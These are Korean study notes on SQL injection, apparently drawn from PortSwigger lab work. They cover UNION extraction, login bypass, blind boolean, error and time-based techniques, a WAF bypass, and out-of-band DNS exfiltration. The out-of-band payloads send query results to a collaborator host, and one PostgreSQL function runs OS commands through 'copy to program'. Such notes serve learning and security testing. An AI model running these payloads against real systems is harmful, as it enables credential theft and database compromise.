## SQL 인젝션

### 데이터베이스 정보 확인

- MySQL: `SELECT @@version`
- Oracle: `SELECT * FROM v$version`
- PostgresSQL: `SELECT version()`

``` url
' UNION SELECT @@version--

' UNION SELECT BANNER, NULL FROM v$version
```
- `UNION` 공격을 할 수 있음. 
- 컬럼 갯수를 맞춰야함. 


### 테이블 정보 확인

- 대부분의 데이터베이스 (오라클 제외)
``` sql
-- 테이블 목록 확인
SELECT * FROM information_schema.tables

-- 출력 결과 
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE 
MyDatabase    dbo          Products   BASE TABLE 
MyDatabase    dbo          Users      BASE TABLE 
MyDatabase    dbo          Feedback   BASE TABLE

-- 컬럼 목록 확인
SELECT * FROM information_schema.columns WHERE table_name = 'Users'

-- 출력 결과
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE 
MyDatabase        dbo       Users      UserId     int 
MyDatabase        dbo       Users      Username   varchar 
MyDatabase        dbo       Users      Password   varchar
```

- 오라클 
``` sql 
-- 테이블 목록 확인
SELECT * FROM all_tables

-- 컬럼 목록 확인
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```

### 주석 활용

1. Oracle: 
	- `--`
	- `/* */`
2. Microsoft
	- `--`
	- `/* */`
3. PostgreSQL
	- `--`
	- `/* */`
4. MySQL
	- `-- `: 뒤에 공백 필수, `--+`나 `--%20`를 사용
	- `#`: 인코딩 된 %23를 사용하는 것이 편함. (그냥 `#`을 사용하면 변환이 안됨.)
	- `/* */`


SQL 주석을 활용

``` sql
-- 로그인 시 날아가는 쿼리
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'

-- 주석을 활용한 관리자 로그인
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```
- `administrator'--`를 입력하면 뒷부분이 주석처리 됨.


### UNION 공격

`UNION` 키워드를 활용하면 다른 테이블의 데이터를 가져올 수 있음. 

``` sql
-- 기본 쿼리 (내부적으로 날아가기 때문에 정확한 쿼리의 형태는 모름.)
SELECT name, description FROM products WHERE category = 'Gifts'

-- 공격자가 입려하는 쿼리
SELECT name, description FROM products WHERE category = 'Gifts ' UNION SELECT username, password FROM users--'
```

필수조건 
- **각각의 쿼리는 동일한 수의 컬럼을 반환해야 함.**
- **각 열에 포함된 데이터 유형은 해당 쿼리들 간에 서로 호환되어야 함.**

따라서 기본 쿼리의 컬럼 개수와 타입을 찾아내야하는데 이때 `SELECT NULL`과 `SELECT 'abc'` 사용함. 

- **컬럼 개수**를 찾아내는 방법
	1. `' ORDER BY 1--`, `' ORDER BY 2--` 이렇게 계속 넣어보면 컬럼 개수가 넘어갈때 에러가 발생함.
	2. `' UNION SELECT NULL--`, `' UNION SELECT NULL, NULL--`, `' UNION SELECT NULL, NULL, NULL--` 이렇게 계속 넣어보면서 에러가 발생하지 않을 때 NULL의 개수가 컬럼 개수임. 
		- 오라클에서는 모든 `SELECT`문에서 `FROM`을 지정해야하기 때문에 `dual` 내장 테이블을 사용하면 됨.

- **컬럼 타입**을 찾아내는 방법
	- `' UNION SELECT 'a', NULL, NULL--`, `' UNION SELECT NULL, 'a', NULL--`에서 에러가 발생하지 않으면 해당 컬럼이 문자열 컬럼인 것임. 

- 단일 컬럼 내에서 여러 값을 가져오기
``` sql
-- Oracle, PostgresSQL
UNION SELECT username || '~' || password FROM users

-- Microsoft SQL
UNION SELECT username + '~' + password FROM users

-- MySQL
UNION SELECT CONCAT(username, '~', password) FROM users
```


### XML 엔티티 인코딩 WAF 우회

애플리케이션이 SQL 쿼리를 처리할때 프론트엔드에서 보낸 JSON이나 XML 형식의 데이터를 입력으로 받아들이고, 서버가 이를 이용해 DB에 쿼리를 보내는 경우가 있음. 
이런 경우에 WAF나 기타 방어 메커니즘이 있으면 `SELECT`, `UNION` 등의 민감한 키워드를 금지함. 
**XML 엔티티 인코딩을 활용하면 우회할 수 있음.** 

``` xml
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```
- `S`의 인코딩인 `&#x53;`를 사용하면 WAF를 통과할 수 있고 서버에서 디코딩 되어 사용됨. 
- Burf Suite에서는 Hackvertor를 사용해서 hex_entities 인코딩 설정을 간편하게 할 수 있음.


## 블라인드 인젝션

HTTP 응답에 해당 SQL 쿼리의 결과나 데이터베이스 오류가 포함되지 않은 상황 (즉, 쿼리 결과를 화면에 뿌려주지 않음.)

HTTP에 쿠키 헤더가 포함되어 있는 경우 (`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`)
`TrackingId` 쿠키가 포함된 요청을 처리할 때, 서버에서 쿼리를 날려서 사용자를 확인함. 
``` sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

**이를 이용하면 뒤에 AND 조건을 붙여서 쿼리가 성공인지 실패인지 판단할 수 있음.** 

### 사전 확인

1. 작은따옴표(`'`)가 응답에 영향을 미치고 있는지 확인
``` txt
TrackingId=xyz'  // 오류 발생됨. 
TrackingId=xyz'' // 오류가 사라짐. 
```

2. 서버가 해당 인젝션을 SQL 쿼리로 해석하는지 확인
``` txt
TrackingId=xyz'||(SELECT '')||' // 오라클, PostgreSQL
TrackingId=xyz'||(SELECT '' FROM dual)||'  // 오라클
```

3. 테이블 확인
``` txt
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'   // 오라클
TrackingId=xyz'||(SELECT '' FROM users LIMIT 1)||'   // PostgreSQL
TrackingId=xyz'||(SELECT TOP 1 '' FROM users)||'   // MS-SQL
```


### 조건부 응답

조건에 맞는 경우와 아닌 경우의 응답이 다른 경우에 조건문을 추가해서 원하는 데이터를 얻을 수 있음.

- 예시
``` sql
…xyz' AND '1'='1 
…xyz' AND '1'='2
```

- 길이 확인
``` sql
TrackingId=xyz' AND LENGTH((SELECT password FROM users WHERE username = 'administrator')) = 20--
```
- 문자 확인
``` sql
TrackingId=xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

*참고: 특수문자 < 숫자 (0 ~ 9) < 대문자 (A ~ Z) < 소문자 (a ~ z)*

### 조건부 오류

조건이 맞는 경우에 의도적으로 오류를 발생시켜 원하는 데이터를 얻을 수 있음. 

- 예시 
``` sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

- 길이 확인 
``` sql
xyz' AND (SELECT CASE WHEN LENGTH(password) > 10 THEN TO_CHAR(1/0) ELSE 'a' AND FROM users WHERE username = 'administrator') = 'a

-- 오라클
xyz'||(SELECT CASE WHEN LENGTH(password)>10 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' 
```
- 문자 확인
``` sql
xyz' AND (SELECT CASE WHEN SUBSTRING(password, 1, 1) > 'm' THEN TO_CHAR(1/0) ELSE 'a' AND FROM users WHERE username = 'administrator') = 'a

-- 오라클
xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

- **Oracle 데이터베이스를 공격할 때:** Oracle의 특성을 가장 잘 파고드는 형태이기 때문에, 2번(`||`) 방식을 많이 사용함. 
- **MySQL, MSSQL 등 다른 데이터베이스를 공격할 때:** 다른 DB들은 `||`를 문자열 합치기로 쓰지 않거나 문법이 다르기 때문에, 1번처럼 **`AND`를 사용하는 방식이 훨씬 범용적**으로 많이 사용함.


### 오류 메시지

서버의 잘못된 설정으로 상세한 SQL 오류 메세지가 노출될 때가 있음. 여기서 유용한 데이터를 얻음.
`CAST()` 함수를 활용해, 이상한 타입 변경을 시도하면 발생하는 에러메시지를 발생시킬 수 있음.

``` sql
-- 오류 발생
CAST((SELECT example_column FROM example_table) AS int)

-- 에러 메세지 예시
ERROR: invalid input syntax for type integer: "Example data"
```

``` sql
TrackingId='||CAST((SELECT password FROM users LIMIT 1)as int)||'

TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```


### 시간 지연

일반적으로 SQL 쿼리는 애플리케이션에 의해 **동기적으로 처리**되므로, SQL 쿼리의 실행이 지연되면 HTTP 응답도 함께 지연됨. 
이를 통해 HTTP 응답이 도착하는 데 걸리는 시간을 기준으로 삽입된 조건이 참인지 거짓인지를 판단할 수 있음.

- 오라클: `dbms_pipe.receive_message(('a'),10)`
- 마이크로소프트: `WAITFOR DELAY '0:0:10'`
- PostgreSQL: `SELECT pg_sleep(10)`
- MySQL: `SELECT SLEEP(10)`

- 사전 조사 
``` sql
TrackingId=x'||pg_sleep(10)--
```

- 조건 확인
``` sql
TrackingId=x' AND (SELECT CASE WHEN 1=1 THEN pg_sleep(10) ELSE pg_sleep(0) END) IS NULL--
```
``` sql
TrackingId=x'||(select case when substring(password,1,1)='c' then pg_sleep(10) else pg_sleep(0) end from users where username='administrator')--
```


### OAST 아웃오브밴드

OAST(Out-of-Band Application Security Testing)

어떤 애플리케이션 서버는 SQL 쿼리를 **비동기적으로 처리**함. 이런 경우에는 쿼리가 데이터를 반환하든지, 데이터베이스 오류가 발생하든지, 시간 지연이 발생하는지와는 무관하게 애플리케이션의 응답을 반환함. 
SQL 인젝션을 통해서 **자신이 제어하는 DNS(Domain Name Service) 서버**로 통신을 유도함으로써 데이터를 얻어내야함. 

성공확률이 높고 데이터를 직접 유출할 수 있다는 장점이 있기 때문에, 다른 블라인드 인젝션 기술들이 효과적인 상황에서도 OAST 기술이 더 선호되는 경우가 많음. 


**외부 도메인에 대한 DNS 조회를 수행하도록 하는 명령어**
- 오라클
	- 패치가 적용되지 않은 오라클 환경에서 사용 가능: `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`
	- 관리자 권한이 있는 경우 사용 가능: `SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')`
- 마이크로소프트: `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`
- PostgreSQL: `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`
- MySQL: Windosw에서만 가능
	- `LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`
	- `SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`

**데이터 유출을 동반한 DNS 조회 명령어**
- 오라클: `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`
- 마이크로소프트: `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')`
- PostgreSQL
	``` sql
	-- [1단계] f() 라는 이름의 임시 함수를 하나 만듭니다.
	create OR replace function f() returns void as $$
	declare c text; -- c 라는 빈 칸(명령어 조립용) 생성
	declare p text; -- p 라는 빈 칸(비밀번호 저장용) 생성

	begin
	-- [2단계] 탈취할 데이터(비밀번호 등)를 조회해서 p 에 집어넣습니다.
	SELECT into p (SELECT YOUR-QUERY-HERE);

	-- [3단계] nslookup 명령어 글자와 방금 구한 p(비밀번호), 그리고 회원님의 주소를 이어 붙여서 c 에 저장합니다.
	c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';

	-- [4단계] 완벽하게 조립된 문자열 c 를 진짜 SQL 명령어처럼 실행해버립니다!
	execute c;
	END;
	$$ language plpgsql security definer;

	-- [5단계] 지금까지 만든 f() 함수를 비로소 실행합니다.
	SELECT f();
	```
- MySQL: `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`



#### 네트워크 배경 지식

- 특정 주소(예: `example.com`) 요청이 발생하면 설정한 DNS 서버에 요청을 보내고 없는 경우에 .com DNS 서버로 요청을 보냄. 
- .com DNS 서버에서 `example.com`를 관리하는 DNS 서버의 주소를 알려주고, 해당 DNS 서버로 요청을 보냄.
	- `example.com`을 관리하는 DNS 서버는 클라우드 서비스의 DNS 서버일수도 있고 서버 관리자가 직접 .com DNS에 등록한 DNS 서버일 수도 있음. 
- DNS 서버에서 `example.com`의 IP 주소를 알려주면, 해당 IP 주소로 요청을 보냄. 

#### Interactsh

**DNS 서버와 로그 기록/출력 프로그램이 합쳐진 프로그램**
DNS 서버로 위장을 하여 SQL 쿼리 결과가 넘어오는지 아닌지 확인할 수 있음. 

- 내장 DNS 서버 (포트 53): 외부에서 들어오는 DNS 쿼리 패킷을 파싱하고, 무조건 자신의 IP를 반환해줌.
- 내장 HTTP/SMTP 서버 (포트 80,443,25 등): DNS 조회를 마친 타겟 서버가 웹이나 이메일로 2차 접속을 시도할 때, 이를 받아주고 더미 응답을 던져주는 기능
- 로깅 및 세션 관리자: 1,2번 포트로 들어온 패킷들의 내용을 전부 기록하여 확인할 수 있음. 

1. 무료 공개 서버를 사용하는 방법
	- **도메인 구매**: Interactsh에서 이미 `interactsh.com` 도메인을 구매하여 등록 해둠.
	- **NS(Name Server) 등록**: 도메인 등록 업체(가비아 등)한테 .com DNS 서버에 `interactsh.com`에 대한 요청을 자신들이 운영하는 Interactsh 네임서버 IP로 등록하도록 요청
	- `interactsh.com`에 대한 요청은 Interactsh의 내장 DNS 서버로 넘어오고 기록됨. 그걸 사용자가 확인할 수 있음. 

2. 직접 서버를 구축하는 방법
	- **서버 설정**: 클라우드 서버에서 Interactsh를 하나 띄워둠. 
	- **NS(Name Server) 등록**: 도메인 등록 업체(가비아 등)한테 .com DNS 서버에 내가 구매한 도메인에 대한 요청을 현재 내 클라우드 서버에서 돌아가는 Interactsh의 DNS 서버 주소를 등록하도록 요청
	- 해당 도메인에 대한 요청은 Interactsh의 내장 DNS 서버로 넘어오고 기록됨. 그걸 서버 운영자가 확인 가능함. 
	- *주의: 클라우드 서비스에 도메인을 등록하면 클라우드 서비스 DNS 서버에 내 도메인과 IP가 등록되므로 Interactsh DNS 서버로 요청이 오지 않고 바로 IP로 요청이 옴. 클라우드 서비스에 등록하고 싶으면 서브도메인 위임 방식을 사용해야함*

**서브 도메인 위임**
	이 방식을 쓰려면 클라우드 DNS 관리자 화면(예: Cloudflare, Route53)에서 **단 2개의 레코드**만 추가해야함. 

1. A 레코드 추가
    - 유형: `A`
    - 이름: `ns1` (또는 원하는 이름)
    - 값 (IP): `1.2.3.4`
    - 의미: 내 Interactsh 서버를 가리키는 `ns1.example.com`이라는 주소를 만듦.

2. NS 레코드 추가
    - 유형: `NS`
    - 이름: `oast` (또는 해킹 전용으로 쓸 앞자리)
    - 값: `ns1.example.com`
    - 의미: 앞으로 `*.oast.example.com`으로 오는 모든 질문은 `ns1.example.com(1.2.3.4)`으로 보냄.

	타겟 서버에 `12345.oast.example.com`으로 DNS 쿼리를 날리도록 페이로드를 쏘면, 중간에 클라우드 DNS에서 **IP 1.2.3.4의 53번 포트(Interactsh의 DNS 서버)로 찾아가라고 알려줌. (NS 레코드로 설정되어있기 때문).** 1.2.3.4 53번 포트로 오면 Interactsh에 기록됨. 


## SQL 인젝션 치트 시트

https://portswigger.net/web-security/sql-injection/cheat-sheet

### 세미콜론(`;` )을 이용한 다중 쿼리 실행

- MS SQL Server / PostgreSQL: 가능
- MySQL / Oracle: 대부분 불가능. 기본 설정이나 연결 방식(API)에 따라 **한 번의 요청에 쿼리는 딱 하나**만 처리
